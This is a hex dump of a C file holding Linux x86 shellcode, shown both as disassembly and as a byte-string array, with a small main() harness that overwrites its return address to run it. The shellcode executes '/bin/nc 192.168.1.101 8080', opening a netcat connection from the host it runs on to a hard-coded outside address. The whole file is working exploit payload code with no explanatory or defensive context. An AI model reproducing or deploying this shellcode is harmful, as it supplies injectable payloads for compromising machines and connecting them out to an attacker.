00000000  2f 2a 0a 30 38 30 34 38  30 36 30 20 3c 5f 73 74  |/*.08048060 <_st|
00000010  61 72 74 3e 3a 0a 20 38  30 34 38 30 36 30 3a 20  |art>:. 8048060: |
00000020  20 20 20 20 20 20 65 62  20 32 61 20 20 20 20 20  |      eb 2a     |
00000030  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6a 6d  |              jm|
00000040  70 20 20 20 20 38 30 34  38 30 38 63 20 3c 47 6f  |p    804808c <Go|
00000050  74 6f 43 61 6c 6c 3e 0a  20 0a 30 38 30 34 38 30  |toCall>. .080480|
00000060  36 32 20 3c 73 68 65 6c  6c 63 6f 64 65 3e 3a 0a  |62 <shellcode>:.|
00000070  20 38 30 34 38 30 36 32  3a 20 20 20 20 20 20 20  | 8048062:       |
00000080  35 65 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |5e              |
00000090  20 20 20 20 20 20 20 20  70 6f 70 20 20 20 20 25  |        pop    %|
000000a0  65 73 69 0a 20 38 30 34  38 30 36 33 3a 20 20 20  |esi. 8048063:   |
000000b0  20 20 20 20 33 31 20 63  30 20 20 20 20 20 20 20  |    31 c0       |
000000c0  20 20 20 20 20 20 20 20  20 20 20 20 78 6f 72 20  |            xor |
000000d0  20 20 20 25 65 61 78 2c  25 65 61 78 0a 20 38 30  |   %eax,%eax. 80|
000000e0  34 38 30 36 35 3a 20 20  20 20 20 20 20 38 38 20  |48065:       88 |
000000f0  34 36 20 30 37 20 20 20  20 20 20 20 20 20 20 20  |46 07           |
00000100  20 20 20 20 20 6d 6f 76  20 20 20 20 25 61 6c 2c  |     mov    %al,|
00000110  30 78 37 28 25 65 73 69  29 0a 20 38 30 34 38 30  |0x7(%esi). 80480|
00000120  36 38 3a 20 20 20 20 20  20 20 38 38 20 34 36 20  |68:       88 46 |
00000130  31 35 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |15              |
00000140  20 20 6d 6f 76 20 20 20  20 25 61 6c 2c 30 78 31  |  mov    %al,0x1|
00000150  35 28 25 65 73 69 29 0a  20 38 30 34 38 30 36 62  |5(%esi). 804806b|
00000160  3a 20 20 20 20 20 20 20  38 38 20 34 36 20 31 61  |:       88 46 1a|
00000170  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000180  6d 6f 76 20 20 20 20 25  61 6c 2c 30 78 31 61 28  |mov    %al,0x1a(|
00000190  25 65 73 69 29 0a 20 38  30 34 38 30 36 65 3a 20  |%esi). 804806e: |
000001a0  20 20 20 20 20 20 38 39  20 37 36 20 31 62 20 20  |      89 76 1b  |
000001b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6d 6f  |              mo|
000001c0  76 20 20 20 20 25 65 73  69 2c 30 78 31 62 28 25  |v    %esi,0x1b(%|
000001d0  65 73 69 29 0a 20 38 30  34 38 30 37 31 3a 20 20  |esi). 8048071:  |
000001e0  20 20 20 20 20 38 64 20  35 65 20 30 38 20 20 20  |     8d 5e 08   |
000001f0  20 20 20 20 20 20 20 20  20 20 20 20 20 6c 65 61  |             lea|
00000200  20 20 20 20 30 78 38 28  25 65 73 69 29 2c 25 65  |    0x8(%esi),%e|
00000210  62 78 0a 20 38 30 34 38  30 37 34 3a 20 20 20 20  |bx. 8048074:    |
00000220  20 20 20 38 39 20 35 65  20 31 66 20 20 20 20 20  |   89 5e 1f     |
00000230  20 20 20 20 20 20 20 20  20 20 20 6d 6f 76 20 20  |           mov  |
00000240  20 20 25 65 62 78 2c 30  78 31 66 28 25 65 73 69  |  %ebx,0x1f(%esi|
00000250  29 0a 20 38 30 34 38 30  37 37 3a 20 20 20 20 20  |). 8048077:     |
00000260  20 20 38 64 20 35 65 20  31 36 20 20 20 20 20 20  |  8d 5e 16      |
00000270  20 20 20 20 20 20 20 20  20 20 6c 65 61 20 20 20  |          lea   |
00000280  20 30 78 31 36 28 25 65  73 69 29 2c 25 65 62 78  | 0x16(%esi),%ebx|
00000290  0a 20 38 30 34 38 30 37  61 3a 20 20 20 20 20 20  |. 804807a:      |
000002a0  20 38 39 20 35 65 20 32  33 20 20 20 20 20 20 20  | 89 5e 23       |
000002b0  20 20 20 20 20 20 20 20  20 6d 6f 76 20 20 20 20  |         mov    |
000002c0  25 65 62 78 2c 30 78 32  33 28 25 65 73 69 29 0a  |%ebx,0x23(%esi).|
000002d0  20 38 30 34 38 30 37 64  3a 20 20 20 20 20 20 20  | 804807d:       |
000002e0  38 39 20 34 36 20 32 37  20 20 20 20 20 20 20 20  |89 46 27        |
000002f0  20 20 20 20 20 20 20 20  6d 6f 76 20 20 20 20 25  |        mov    %|
00000300  65 61 78 2c 30 78 32 37  28 25 65 73 69 29 0a 20  |eax,0x27(%esi). |
00000310  38 30 34 38 30 38 30 3a  20 20 20 20 20 20 20 62  |8048080:       b|
00000320  30 20 30 62 20 20 20 20  20 20 20 20 20 20 20 20  |0 0b            |
00000330  20 20 20 20 20 20 20 6d  6f 76 20 20 20 20 24 30  |       mov    $0|
00000340  78 62 2c 25 61 6c 0a 20  38 30 34 38 30 38 32 3a  |xb,%al. 8048082:|
00000350  20 20 20 20 20 20 20 38  39 20 66 33 20 20 20 20  |       89 f3    |
00000360  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |               m|
00000370  6f 76 20 20 20 20 25 65  73 69 2c 25 65 62 78 0a  |ov    %esi,%ebx.|
00000380  20 38 30 34 38 30 38 34  3a 20 20 20 20 20 20 20  | 8048084:       |
00000390  38 64 20 34 65 20 31 62  20 20 20 20 20 20 20 20  |8d 4e 1b        |
000003a0  20 20 20 20 20 20 20 20  6c 65 61 20 20 20 20 30  |        lea    0|
000003b0  78 31 62 28 25 65 73 69  29 2c 25 65 63 78 0a 20  |x1b(%esi),%ecx. |
000003c0  38 30 34 38 30 38 37 3a  20 20 20 20 20 20 20 38  |8048087:       8|
000003d0  64 20 35 36 20 32 37 20  20 20 20 20 20 20 20 20  |d 56 27         |
000003e0  20 20 20 20 20 20 20 6c  65 61 20 20 20 20 30 78  |       lea    0x|
000003f0  32 37 28 25 65 73 69 29  2c 25 65 64 78 0a 20 38  |27(%esi),%edx. 8|
00000400  30 34 38 30 38 61 3a 20  20 20 20 20 20 20 63 64  |04808a:       cd|
00000410  20 38 30 20 20 20 20 20  20 20 20 20 20 20 20 20  | 80             |
00000420  20 20 20 20 20 20 69 6e  74 20 20 20 20 24 30 78  |      int    $0x|
00000430  38 30 0a 20 0a 30 38 30  34 38 30 38 63 20 3c 47  |80. .0804808c <G|
00000440  6f 74 6f 43 61 6c 6c 3e  3a 0a 20 38 30 34 38 30  |otoCall>:. 80480|
00000450  38 63 3a 20 20 20 20 20  20 20 65 38 20 64 31 20  |8c:       e8 d1 |
00000460  66 66 20 66 66 20 66 66  20 20 20 20 20 20 20 20  |ff ff ff        |
00000470  20 20 63 61 6c 6c 20 20  20 38 30 34 38 30 36 32  |  call   8048062|
00000480  20 3c 73 68 65 6c 6c 63  6f 64 65 3e 0a 20 38 30  | <shellcode>. 80|
00000490  34 38 30 39 31 3a 20 20  20 20 20 20 20 32 66 20  |48091:       2f |
000004a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004b0  20 20 20 20 20 64 61 73  20 20 20 0a 20 38 30 34  |     das   . 804|
000004c0  38 30 39 32 3a 20 20 20  20 20 20 20 36 32 20 36  |8092:       62 6|
000004d0  39 20 36 65 20 20 20 20  20 20 20 20 20 20 20 20  |9 6e            |
000004e0  20 20 20 20 62 6f 75 6e  64 20 20 25 65 62 70 2c  |    bound  %ebp,|
000004f0  30 78 36 65 28 25 65 63  78 29 0a 20 38 30 34 38  |0x6e(%ecx). 8048|
00000500  30 39 35 3a 20 20 20 20  20 20 20 32 66 20 20 20  |095:       2f   |
00000510  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000520  20 20 20 64 61 73 20 20  20 0a 20 38 30 34 38 30  |   das   . 80480|
00000530  39 36 3a 20 20 20 20 20  20 20 36 65 20 20 20 20  |96:       6e    |
00000540  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000550  20 20 6f 75 74 73 62 20  20 25 64 73 3a 28 25 65  |  outsb  %ds:(%e|
00000560  73 69 29 2c 28 25 64 78  29 0a 20 38 30 34 38 30  |si),(%dx). 80480|
00000570  39 37 3a 20 20 20 20 20  20 20 36 33 20 32 33 20  |97:       63 23 |
00000580  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000590  20 20 61 72 70 6c 20 20  20 25 73 70 2c 28 25 65  |  arpl   %sp,(%e|
000005a0  62 78 29 0a 20 38 30 34  38 30 39 39 3a 20 20 20  |bx). 8048099:   |
000005b0  20 20 20 20 33 31 20 33  39 20 20 20 20 20 20 20  |    31 39       |
000005c0  20 20 20 20 20 20 20 20  20 20 20 20 78 6f 72 20  |            xor |
000005d0  20 20 20 25 65 64 69 2c  28 25 65 63 78 29 0a 20  |   %edi,(%ecx). |
000005e0  38 30 34 38 30 39 62 3a  20 20 20 20 20 20 20 33  |804809b:       3|
000005f0  32 20 32 65 20 20 20 20  20 20 20 20 20 20 20 20  |2 2e            |
00000600  20 20 20 20 20 20 20 78  6f 72 20 20 20 20 28 25  |       xor    (%|
00000610  65 73 69 29 2c 25 63 68  0a 20 38 30 34 38 30 39  |esi),%ch. 804809|
00000620  64 3a 20 20 20 20 20 20  20 33 31 20 33 36 20 20  |d:       31 36  |
00000630  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000640  20 78 6f 72 20 20 20 20  25 65 73 69 2c 28 25 65  | xor    %esi,(%e|
00000650  73 69 29 0a 20 38 30 34  38 30 39 66 3a 20 20 20  |si). 804809f:   |
00000660  20 20 20 20 33 38 20 32  65 20 20 20 20 20 20 20  |    38 2e       |
00000670  20 20 20 20 20 20 20 20  20 20 20 20 63 6d 70 20  |            cmp |
00000680  20 20 20 25 63 68 2c 28  25 65 73 69 29 0a 20 38  |   %ch,(%esi). 8|
00000690  30 34 38 30 61 31 3a 20  20 20 20 20 20 20 33 31  |0480a1:       31|
000006a0  20 32 65 20 20 20 20 20  20 20 20 20 20 20 20 20  | 2e             |
000006b0  20 20 20 20 20 20 78 6f  72 20 20 20 20 25 65 62  |      xor    %eb|
000006c0  70 2c 28 25 65 73 69 29  0a 20 38 30 34 38 30 61  |p,(%esi). 80480a|
000006d0  33 3a 20 20 20 20 20 20  20 33 31 20 33 30 20 20  |3:       31 30  |
000006e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000006f0  20 78 6f 72 20 20 20 20  25 65 73 69 2c 28 25 65  | xor    %esi,(%e|
00000700  61 78 29 0a 20 38 30 34  38 30 61 35 3a 20 20 20  |ax). 80480a5:   |
00000710  20 20 20 20 33 31 20 32  33 20 20 20 20 20 20 20  |    31 23       |
00000720  20 20 20 20 20 20 20 20  20 20 20 20 78 6f 72 20  |            xor |
00000730  20 20 20 25 65 73 70 2c  28 25 65 62 78 29 0a 20  |   %esp,(%ebx). |
00000740  38 30 34 38 30 61 37 3a  20 20 20 20 20 20 20 33  |80480a7:       3|
00000750  38 20 33 30 20 20 20 20  20 20 20 20 20 20 20 20  |8 30            |
00000760  20 20 20 20 20 20 20 63  6d 70 20 20 20 20 25 64  |       cmp    %d|
00000770  68 2c 28 25 65 61 78 29  0a 20 38 30 34 38 30 61  |h,(%eax). 80480a|
00000780  39 3a 20 20 20 20 20 20  20 33 38 20 33 30 20 20  |9:       38 30  |
00000790  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000007a0  20 63 6d 70 20 20 20 20  25 64 68 2c 28 25 65 61  | cmp    %dh,(%ea|
000007b0  78 29 0a 20 38 30 34 38  30 61 62 3a 20 20 20 20  |x). 80480ab:    |
000007c0  20 20 20 32 33 20 34 31  20 34 31 20 20 20 20 20  |   23 41 41     |
000007d0  20 20 20 20 20 20 20 20  20 20 20 61 6e 64 20 20  |           and  |
000007e0  20 20 30 78 34 31 28 25  65 63 78 29 2c 25 65 61  |  0x41(%ecx),%ea|
000007f0  78 0a 20 38 30 34 38 30  61 65 3a 20 20 20 20 20  |x. 80480ae:     |
00000800  20 20 34 31 20 20 20 20  20 20 20 20 20 20 20 20  |  41            |
00000810  20 20 20 20 20 20 20 20  20 20 69 6e 63 20 20 20  |          inc   |
00000820  20 25 65 63 78 0a 20 38  30 34 38 30 61 66 3a 20  | %ecx. 80480af: |
00000830  20 20 20 20 20 20 34 31  20 20 20 20 20 20 20 20  |      41        |
00000840  20 20 20 20 20 20 20 20  20 20 20 20 20 20 69 6e  |              in|
00000850  63 20 20 20 20 25 65 63  78 0a 20 38 30 34 38 30  |c    %ecx. 80480|
00000860  62 30 3a 20 20 20 20 20  20 20 34 32 20 20 20 20  |b0:       42    |
00000870  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000880  20 20 69 6e 63 20 20 20  20 25 65 64 78 0a 20 38  |  inc    %edx. 8|
00000890  30 34 38 30 62 31 3a 20  20 20 20 20 20 20 34 32  |0480b1:       42|
000008a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000008b0  20 20 20 20 20 20 69 6e  63 20 20 20 20 25 65 64  |      inc    %ed|
000008c0  78 0a 20 38 30 34 38 30  62 32 3a 20 20 20 20 20  |x. 80480b2:     |
000008d0  20 20 34 32 20 20 20 20  20 20 20 20 20 20 20 20  |  42            |
000008e0  20 20 20 20 20 20 20 20  20 20 69 6e 63 20 20 20  |          inc   |
000008f0  20 25 65 64 78 0a 20 38  30 34 38 30 62 33 3a 20  | %edx. 80480b3: |
00000900  20 20 20 20 20 20 34 32  20 20 20 20 20 20 20 20  |      42        |
00000910  20 20 20 20 20 20 20 20  20 20 20 20 20 20 69 6e  |              in|
00000920  63 20 20 20 20 25 65 64  78 0a 20 38 30 34 38 30  |c    %edx. 80480|
00000930  62 34 3a 20 20 20 20 20  20 20 34 33 20 20 20 20  |b4:       43    |
00000940  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000950  20 20 69 6e 63 20 20 20  20 25 65 62 78 0a 20 38  |  inc    %ebx. 8|
00000960  30 34 38 30 62 35 3a 20  20 20 20 20 20 20 34 33  |0480b5:       43|
00000970  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000980  20 20 20 20 20 20 69 6e  63 20 20 20 20 25 65 62  |      inc    %eb|
00000990  78 0a 20 38 30 34 38 30  62 36 3a 20 20 20 20 20  |x. 80480b6:     |
000009a0  20 20 34 33 20 20 20 20  20 20 20 20 20 20 20 20  |  43            |
000009b0  20 20 20 20 20 20 20 20  20 20 69 6e 63 20 20 20  |          inc   |
000009c0  20 25 65 62 78 0a 20 38  30 34 38 30 62 37 3a 20  | %ebx. 80480b7: |
000009d0  20 20 20 20 20 20 34 33  20 20 20 20 20 20 20 20  |      43        |
000009e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 69 6e  |              in|
000009f0  63 20 20 20 20 25 65 62  78 0a 20 38 30 34 38 30  |c    %ebx. 80480|
00000a00  62 38 3a 20 20 20 20 20  20 20 34 34 20 20 20 20  |b8:       44    |
00000a10  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a20  20 20 69 6e 63 20 20 20  20 25 65 73 70 0a 20 38  |  inc    %esp. 8|
00000a30  30 34 38 30 62 39 3a 20  20 20 20 20 20 20 34 34  |0480b9:       44|
00000a40  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a50  20 20 20 20 20 20 69 6e  63 20 20 20 20 25 65 73  |      inc    %es|
00000a60  70 0a 20 38 30 34 38 30  62 61 3a 20 20 20 20 20  |p. 80480ba:     |
00000a70  20 20 34 34 20 20 20 20  20 20 20 20 20 20 20 20  |  44            |
00000a80  20 20 20 20 20 20 20 20  20 20 69 6e 63 20 20 20  |          inc   |
00000a90  20 25 65 73 70 0a 20 38  30 34 38 30 62 62 3a 20  | %esp. 80480bb: |
00000aa0  20 20 20 20 20 20 34 34  20 20 20 20 20 20 20 20  |      44        |
00000ab0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 69 6e  |              in|
00000ac0  63 20 20 20 20 25 65 73  70 0a 2a 2f 0a 20 0a 2f  |c    %esp.*/. ./|
00000ad0  2f 20 2f 62 69 6e 2f 6e  63 20 31 39 32 2e 31 36  |/ /bin/nc 192.16|
00000ae0  38 2e 31 2e 31 30 31 20  38 30 38 30 0a 63 68 61  |8.1.101 8080.cha|
00000af0  72 20 73 68 65 6c 6c 63  6f 64 65 5b 5d 20 3d 0a  |r shellcode[] =.|
00000b00  22 5c 78 65 62 5c 78 32  61 5c 78 35 65 5c 78 33  |"\xeb\x2a\x5e\x3|
00000b10  31 5c 78 63 30 5c 78 38  38 5c 78 34 36 5c 78 30  |1\xc0\x88\x46\x0|
00000b20  37 5c 78 38 38 5c 78 34  36 5c 78 31 35 5c 78 38  |7\x88\x46\x15\x8|
00000b30  38 5c 78 34 36 5c 78 31  61 5c 78 38 39 5c 78 37  |8\x46\x1a\x89\x7|
00000b40  36 5c 78 31 62 5c 78 38  64 5c 78 35 65 5c 78 30  |6\x1b\x8d\x5e\x0|
00000b50  38 5c 78 38 39 22 0a 22  5c 78 35 65 5c 78 31 66  |8\x89"."\x5e\x1f|
00000b60  5c 78 38 64 5c 78 35 65  5c 78 31 36 5c 78 38 39  |\x8d\x5e\x16\x89|
00000b70  5c 78 35 65 5c 78 32 33  5c 78 38 39 5c 78 34 36  |\x5e\x23\x89\x46|
00000b80  5c 78 32 37 5c 78 62 30  5c 78 30 62 5c 78 38 39  |\x27\xb0\x0b\x89|
00000b90  5c 78 66 33 5c 78 38 64  5c 78 34 65 5c 78 31 62  |\xf3\x8d\x4e\x1b|
00000ba0  5c 78 38 64 5c 78 35 36  5c 78 32 37 22 0a 22 5c  |\x8d\x56\x27"."\|
00000bb0  78 63 64 5c 78 38 30 5c  78 65 38 5c 78 64 31 5c  |xcd\x80\xe8\xd1\|
00000bc0  78 66 66 5c 78 66 66 5c  78 66 66 5c 78 32 66 5c  |xff\xff\xff\x2f\|
00000bd0  78 36 32 5c 78 36 39 5c  78 36 65 5c 78 32 66 5c  |x62\x69\x6e\x2f\|
00000be0  78 36 65 5c 78 36 33 5c  78 32 33 5c 78 33 31 5c  |x6e\x63\x23\x31\|
00000bf0  78 33 39 5c 78 33 32 5c  78 32 65 5c 78 33 31 5c  |x39\x32\x2e\x31\|
00000c00  78 33 36 22 0a 22 5c 78  33 38 5c 78 32 65 5c 78  |x36"."\x38\x2e\x|
00000c10  33 31 5c 78 32 65 5c 78  33 31 5c 78 33 30 5c 78  |31\x2e\x31\x30\x|
00000c20  33 31 5c 78 32 33 5c 78  33 38 5c 78 33 30 5c 78  |31\x23\x38\x30\x|
00000c30  33 38 5c 78 33 30 5c 78  32 33 22 3b 0a 20 0a 69  |38\x30\x23";. .i|
00000c40  6e 74 20 6d 61 69 6e 28  29 0a 7b 0a 20 20 20 20  |nt main().{.    |
00000c50  69 6e 74 20 2a 72 65 74  3b 0a 20 20 20 20 72 65  |int *ret;.    re|
00000c60  74 20 3d 20 28 69 6e 74  20 2a 29 26 72 65 74 20  |t = (int *)&ret |
00000c70  2b 20 32 3b 0a 20 20 20  20 28 2a 72 65 74 29 20  |+ 2;.    (*ret) |
00000c80  3d 20 28 69 6e 74 29 73  68 65 6c 6c 63 6f 64 65  |= (int)shellcode|
00000c90  3b 0a 7d                                          |;.}|
00000c93
